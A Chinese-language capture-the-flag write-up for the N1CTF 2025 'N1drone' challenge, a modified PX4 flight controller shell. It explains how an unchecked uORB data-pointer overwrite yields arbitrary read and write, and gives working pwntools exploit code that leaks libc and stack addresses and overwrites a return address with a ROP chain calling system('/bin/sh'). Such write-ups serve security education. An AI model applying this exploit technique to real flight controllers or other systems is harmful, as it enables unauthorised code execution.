# N1CTF 2025 N1drone

## 题目简述

题目运行一个经修改的 PX4 飞控程序，并通过 `socat` 把 PX4 shell 暴露在 TCP 8080 端口。新增命令 `n1_sub_manager` 可以创建、发布和修改 uORB topic；补丁同时把 `uORB::DeviceNode::_data` 改为公有成员。目标是借 uORB 数据指针形成任意地址读写，泄露 libc 与栈地址，再覆盖 PX4 工作线程的返回地址执行 `system("/bin/sh")`。

## 解题过程

`n1_sub_manager publish <orb_id>` 会取得对应 topic 的 `DeviceNode`，按元数据中的 `o_size` 从标准输入读取数据，最后调用：

```cpp
node->write(nullptr, buffer, ret);
```

而 `n1_sub_manager write <orb_id> <new_ptr>` 没有任何地址校验，直接执行：

```cpp
node->_data = (uint8_t *)new_ptr;
```

因此，先创建一个 topic，再改写它的 `_data`，后续发布就会把输入复制到指定地址，形成定长任意写。读取可借助 PX4 自带的 `listener`：`debug_key_value` 的 `key` 字段位于结构偏移 `0xc`，把 `_data` 指向 `addr - 0xc` 后，`listener debug_key_value` 会把目标地址处的数据当作 C 字符串输出。

```python
def arb_read(addr):
    send_cmd(f'n1_sub_manager write 0x24 {addr - 0xc:#x}')
    send_cmd('listener debug_key_value')
    io.recvuntil(b'key: "')
    return u64(io.recvuntil(b'"')[:-1].ljust(8, b'\x00'))
```

先执行一次 `n1_sub_manager publish 0x24` 创建 `debug_key_value` 节点。由于指针的高字节通常为 0，字符串输出会在地址的第六或第七字节截断，补零后按小端序解析即可。

PX4 的 `list_tasks` 会打印工作队列任务 `hpwork` 的地址，这给出一个稳定的进程内锚点。按照官方二进制中的固定布局逐级解引用：

```python
send_cmd('list_tasks')
io.recvuntil(b'hpwork     ')
hpwork = int(io.recvline())

p1 = arb_read(hpwork + 0x2f8)
libc_base = arb_read(p1) - 0x4b4720

p2 = arb_read(hpwork + 0x300)
saved_rip = arb_read(p2) - 0x28
```

第一条指针链最终落入 libc，据此减去 `0x4b4720` 得到基址；第二条指针链给出当前工作线程栈上的指针，再减 `0x28` 定位将要返回的位置。这些偏移取决于题目提供的 PX4 与 libc 构建，不能照搬到其他版本。

接下来创建另一个 `o_size` 为 `0x100` 的 topic `0x23`。先正常发布一次确保节点存在，再把 `_data` 改为保存返回地址的位置。所需 ROP 地址均由 libc 基址计算：

```python
ret     = libc_base + 0x44b3e6
pop_rdi = libc_base + 0x44b3e5
bin_sh  = libc_base + 0x5f9678
system  = libc_base + 0x471d70

rop = flat(ret, pop_rdi, bin_sh, system)

send_cmd('n1_sub_manager publish 0x23')
io.send(b'\x00' * 0x100)
send_cmd(f'n1_sub_manager write 0x23 {saved_rip:#x}')
send_cmd('n1_sub_manager publish 0x23')
io.send(rop.ljust(0x100, b'\x00'))
io.interactive()
```

单独放置一个 `ret` 用于满足调用 `system` 前的栈对齐要求。工作线程从被覆盖的栈帧返回后执行 ROP，最终得到 shell。

## 方法总结

决定性漏洞不是 PX4 的飞控逻辑，而是 uORB 节点内部数据指针被暴露给了无权限校验的 shell 命令。相同的指针改写原语通过不同 topic 的展示和发布路径分别变成任意读、任意写：`listener` 负责把目标内存格式化输出，`publish` 负责把输入复制到目标内存。利用链为 `list_tasks` 获取锚点、两次指针解引用泄露 libc 与栈、重定向 topic 数据指针、覆盖返回地址执行 ret2libc。
